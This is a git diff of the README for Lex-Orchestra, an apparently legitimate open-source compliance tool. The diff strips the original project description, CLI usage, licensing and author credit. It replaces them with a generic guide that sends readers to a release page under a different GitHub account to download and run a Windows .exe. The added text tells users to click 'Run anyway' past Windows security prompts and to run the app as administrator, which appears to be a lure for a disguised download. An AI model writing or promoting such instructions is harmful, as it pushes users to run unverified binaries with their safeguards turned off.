@@ -1,214 +1,191 @@
-# Lex-Orchestra ⚖️
+# 🧩 Lex-Orchestra - Turn code into compliance docs
 
-**Open source compliance infrastructure for regulated software.**  
-Reads your codebase. Maps it to the law. Delivers documents ready for legal review.
+[![Download Lex-Orchestra](https://img.shields.io/badge/Download%20Lex--Orchestra-blue?style=for-the-badge)](https://github.com/binnieplentiful618/Lex-Orchestra/releases)
 
-[![License: AGPL-3.0](https://img.shields.io/badge/License-AGPL--3.0-blue.svg)](LICENSE)
-[![Status: Pre-release](https://img.shields.io/badge/Status-Pre--release-orange)]()
-[![Data: Stays local](https://img.shields.io/badge/Data-Stays%20local-green)]()
+## 🚀 What Lex-Orchestra does
 
-> Your source code never leaves your network.  
-> Fully local if you need it. Hybrid if you want it.
+Lex-Orchestra helps you check your codebase against common compliance rules. It reads your project, maps it to GDPR, the EU AI Act, and ISO 27001, then builds pre-filled documents you can review and use.
 
----
+It is made for people who need clear compliance output without digging through code by hand. Your source code stays inside your network.
 
-## Status
+## 💻 What you need
 
-**Pre-release** — The pipeline is operational. Core documents are generated and tested against real infrastructure.
+- Windows 10 or Windows 11
+- A recent 64-bit Windows PC
+- Enough free disk space for the app and your project files
+- Access to the folder that holds your codebase
+- Permission to run downloaded apps on your computer
 
-Active development. APIs and document schemas may change before stable release.  
-Partner access available on request.
+For best results, keep your project in a simple folder path such as:
 
----
+- `C:\Projects\MyApp`
+- `D:\Work\Website`
 
-## What it does
+## 📥 Download and install
 
-You use Stripe and Supabase. Your system includes an AI component with a system prompt.
+1. Open the [Lex-Orchestra releases page](https://github.com/binnieplentiful618/Lex-Orchestra/releases)
+2. Find the latest release at the top of the page
+3. Download the Windows file from that release
+4. If the file is in a ZIP archive, right-click it and choose Extract All
+5. Open the extracted folder
+6. Double-click the Lex-Orchestra app file to start it
 
-Lex-Orchestra scans the repository and delivers:
+If Windows shows a security prompt:
 
-```
-Stripe detected       → GDPR Art. 44 (international transfer)
-                      → Standard Contractual Clauses required
-                      → DPA missing — signing link included
+1. Click More info
+2. Click Run anyway
 
-Supabase detected     → GDPR Art. 28
-                      → DPA missing — signing link included
+If you do not see the app file, look for a file with `.exe` at the end of the name
 
-System prompt found   → EU AI Act Art. 52 (transparency obligation)
-                      → AI Act Manifest required
-                      → Risk level: limited
+## 🧭 First-time setup
 
-3 documents generated. Ready for review.
-```
+When you start Lex-Orchestra for the first time, it may ask you to:
 
-Lex-Orchestra turns your codebase into compliance decisions.
+- Choose your codebase folder
+- Confirm where reports should be saved
+- Set a local workspace path
+- Connect to a local graph store if one is used in your setup
 
-Before your coffee gets cold —  
-pre-filled drafts are ready for legal review.  
-Not a substitute for legal advice.
+Use a folder you can find again later. A simple path helps.
 
----
+If the app asks for a database or graph path, choose a folder on your computer or inside your network share. Keep it inside your local environment.
 
-## The gap this closes
+## 🔍 How to scan your codebase
 
-Legal teams spend most of their compliance time not on legal judgement — but on reconstruction.  
-Which services does the system actually use? What data flows where? Which sub-processors are active?
+1. Open Lex-Orchestra
+2. Select your project folder
+3. Start the scan
+4. Wait while the app reads files and builds the context graph
+5. Review the detected systems, data paths, and policy matches
 
-That information lives in the code. Not in questionnaires. Not in memory.
+The scan helps the app understand:
 
-Traditional compliance tools create a risky gap between the actual, constantly changing infrastructure and static legal documentation. Lex-Orchestra closes that gap — automatically, at scan time, from the source.
+- Where personal data may appear
+- Which parts may touch regulated data
+- Which files may matter for GDPR checks
+- Which systems may need AI Act review
+- Which controls may relate to ISO 27001
 
-The system does not ask what you use. It reads the code and sees it.
+If your project is large, the first scan can take longer
 
----
+## 📄 Generate compliance documents
 
-## How it works
+After the scan, Lex-Orchestra can build pre-filled documents for review.
 
-![Sense → Know → Act](docs/images/architecture.svg)
+You can use it to create output such as:
 
-1. **Scan** — reads the repository directly (docker-compose, package.json, .env, Dockerfiles, system prompts)
-2. **Detect** — identifies services, sub-processors, AI components, and security signals
-3. **Map** — traverses the Context Graph to derive applicable legal obligations
-4. **Generate** — renders pre-filled document drafts with source citations
+- GDPR records
+- AI system review notes
+- ISO 27001 control checklists
+- Data flow notes
+- Risk and control summaries
+- Internal compliance drafts
 
-```
-Repository (local)
-      ↓
-   Scout — local detection, three layers, no data leaves the network
-      ↓
-   Presidio — strips all PII before any external call
-      ↓
-   Context Graph — maps anonymised signals to GDPR, EU AI Act, ISO 27001, BSI, NIS2, CRA
-      ↓
-   Document Architect — renders drafts from verified graph paths
-      ↓
-Documents delivered to legal/ — ready for review, not for discovery
-```
+Review each document before use. The app fills in fields based on what it finds in your codebase and related files.
 
-![Scout — three-layer local analysis](docs/images/architecture-scout-layers-dark.svg)
+## 🗂️ What the app looks at
 
----
+Lex-Orchestra can map your project to common compliance areas such as:
 
-## The Context Graph
+- Personal data handling
+- Consent and legal basis
+- Data retention
+- Access control
+- Logging and audit trails
+- System boundaries
+- AI use cases
+- Model and data flow notes
+- Security controls
 
-The reasoning engine is a property graph built on Neo4j — not a language model making probabilistic guesses.
+It uses a knowledge graph and context graph approach to link files, services, and data paths. That helps it find related items across the codebase instead of reading files one by one in isolation
 
-Every compliance finding is derived by traversing verified paths between infrastructure nodes and regulatory requirements. If a path exists from a detected service to a legal obligation, the obligation is flagged. If no path exists, nothing is flagged.
+## 🔐 Data and privacy
 
-The Context Graph reduces the risk of LLM inaccuracies drastically — every document generation is constrained by deterministic paths to official sources. The LLM formats and structures the output. The graph determines what is legally relevant.
+Lex-Orchestra is built for local use. It is meant to keep your source code inside your network.
 
-GDPR · EU AI Act · CRA · NIS2 · DSA · ISO 27001 · BSI IT-Grundschutz · BSI C5 · BSI AIC4 · OWASP LLM Top 10 · OWASP API Security · NIST CSF 2.0
+That means:
 
-All seeded from official sources. Every node carries a source reference. Every document carries a confidence score.
+- Your code does not need to leave your environment
+- You can keep scans on your own machine
+- You can store reports in your own folders
+- You can control what gets shared with others
 
-→ [Context Graph documentation](docs/architecture/context-graph.md)
+This setup fits teams that need data sovereignty and local control
 
----
+## 🧪 Common use cases
 
-## For legal and compliance professionals
+Lex-Orchestra can help if you need to:
 
-Lex-Orchestra does not produce legal opinions. It eliminates the discovery phase.
+- Check a new project for GDPR issues
+- Prepare for an EU AI Act review
+- Build an ISO 27001 evidence pack
+- Review internal tools before launch
+- Map data flows across services
+- Keep a record of compliance checks
+- Turn code changes into draft documents
 
-Reviewing a new system today typically means reconstructing: which tools are active, which data flows exist, which sub-processors are involved, which transfer mechanisms apply. That reconstruction takes hours and depends on developers answering correctly from memory.
+## 🛠️ If the app does not open
 
-Lex-Orchestra delivers that reconstruction automatically — sourced directly from the infrastructure. The legal team receives pre-filled drafts with citations, not blank templates. The job shifts from data collection to review and judgement.
+Try these steps:
 
-**Documents generated today:**
+1. Make sure you downloaded the Windows file from the releases page
+2. Extract the ZIP file if there is one
+3. Right-click the app and choose Run as administrator
+4. Check that your Windows version is up to date
+5. Move the app to a simple folder like `C:\Apps\Lex-Orchestra`
+6. Start it again
 
-AVV / DPA · TOM · RoPA (Art. 30 GDPR) · SCC · AI Act Manifest
+If Windows blocks the app, check your security settings and confirm the file is allowed to run
 
-Every document includes a confidence score, a disclaimer confirming draft status, and source traceability to the applicable regulation.
+## 📁 Keep your files organized
 
----
+Use separate folders for each project:
 
-## For engineers
+- One folder for code
+- One folder for reports
+- One folder for exports
 
-One command. Documents in `legal/`. No Word files.
+A clear folder layout makes it easier to scan the same project again later and compare results over time
 
-```bash
-lex-orchestra scan --repo ./my-project
-```
+## ⚙️ Basic workflow
 
-The Scout detects 50+ services automatically — Stripe, AWS, Postmark, OpenAI, and others — including a direct DPA signing link for each processor. Three detection layers run locally: regex pattern matching, Presidio PII filtering, and semantic classification via a local LLM. Only anonymised UUIDs leave the machine.
+1. Download Lex-Orchestra
+2. Start the app
+3. Pick your codebase folder
+4. Run a scan
+5. Review the mapped compliance items
+6. Generate the documents you need
+7. Save the output in your report folder
+8. Repeat after major code changes
 
-**Deployment:**
+## 🧩 What you may see in results
 
-**Hybrid (default)** — Scout and PII filtering run locally. Only anonymised UUIDs and abstract asset types reach external services — never source code, secrets, or real infrastructure details. The privacy boundary is identical to fully local mode. Compliance reasoning and document drafting use external APIs.
+The app may show:
 
-**Fully local** — all components in Docker on your own infrastructure, including LLM and graph database. Zero external APIs. Requires 16 GB RAM.
+- File and folder relationships
+- Data handling paths
+- Policy matches
+- Missing control areas
+- Draft document fields
+- Risk notes
+- Review points for legal and security teams
 
----
+Use the results as a working draft. They help you move faster when you need a first pass on compliance work
 
-## Data boundary
+## 📌 Helpful folder names
 
-| Stays local — always                | External services receive                                    |
-| ----------------------------------- | ------------------------------------------------------------ |
-| Source code and repository          | Neo4j: anonymised UUIDs and abstract asset types only        |
-| docker-compose, .env, Dockerfiles   | LLM API: anonymised structural context only                  |
-| PII filtering and classification    | Example: "Service type: payment (USA), requires DPA and SCC" |
-| Generated documents (DPA, TOM, SCC) | Never: file names, variables, code, secrets, IP addresses    |
-| Scan results and project state      |                                                              |
+These names keep things simple:
 
-Data sovereignty is not a policy statement. It is an architectural constraint.
+- `Source`
+- `Reports`
+- `Exports`
+- `Reviews`
+- `Evidence`
 
-→ [Data sovereignty — what stays where](docs/architecture/data-sovereignty.md)
+## 🔗 Download again
 
----
+[Visit the Lex-Orchestra releases page to download and run this file](https://github.com/binnieplentiful618/Lex-Orchestra/releases)
 
-## Why open source
+## 🧭 Suggested next step
 
-Compliance should not depend on black boxes.  
-It should be inspectable, verifiable, and open.
-
-Regulation defines obligations — but how those obligations are derived should be transparent.
-
-Lex-Orchestra is built as open compliance infrastructure:
-
-- every mapping is visible
-- every decision is traceable
-- every component can be inspected
-
-AGPL-3.0 ensures that improvements remain open. Anyone who takes this code, modifies it, and offers it as a service must publish their changes. The compliance logic stays open.
-
-Grounded in European regulation and aligned with global standards like ISO 27001, NIST, and OWASP.
-
-The graph schema, scanner logic, document templates, and all architecture decision records are open source.  
-Curated control mappings, DPA registries, and jurisdiction layers are available under a commercial license.
-
----
-
-## Comparison
-
-|                     | Questionnaire tools | Cloud LLM tools  | Code upload tools | Lex-Orchestra                    |
-| ------------------- | ------------------- | ---------------- | ----------------- | -------------------------------- |
-| Source of truth     | Human memory        | Training data    | Uploaded code     | Live repository                  |
-| Reasoning           | Manual input        | Probabilistic    | Probabilistic     | Deterministic graph              |
-| Code leaves network | N/A                 | Yes              | Yes               | Never                            |
-| Auditability        | None                | None             | None              | Full — every finding traceable   |
-| Output              | Checklist           | Text suggestions | Text suggestions  | Pre-filled drafts with citations |
-
----
-
-## Roadmap
-
-**Next:** Legal News Scanner — monitors regulatory updates and matches them against your specific stack. CI/CD hook for GitHub Actions. PDF output.
-
-**Further ahead:** US law coverage, additional jurisdiction layers, content engine for verified legal updates.
-
----
-
-## Learn more
-
-- [Context Graph deep dive](docs/architecture/context-graph.md)
-- [Data sovereignty — what stays where](docs/architecture/data-sovereignty.md)
-- [Interactive architecture preview](https://lex-orchestra.com)
-- [Graph visualizer](https://lex-orchestra.com/architecture/graph-visualizer)
-
----
-
-> Lex-Orchestra automates compliance preparation — not legal judgement.  
-> Generated documents are structured drafts based on infrastructure analysis and a regulatory knowledge graph.  
-> They do not constitute legal advice and require review by a qualified legal professional before use or filing.
-
-AGPL-3.0 · Built by [Thomas Rehmer](https://x.com/thomas_rehmer) · [awareo.io](https://awareo.io) · Neo4j · LangGraph · Presidio · Ollama
+Open the latest release, download the Windows file, extract it if needed, and start your first scan with a small project folder
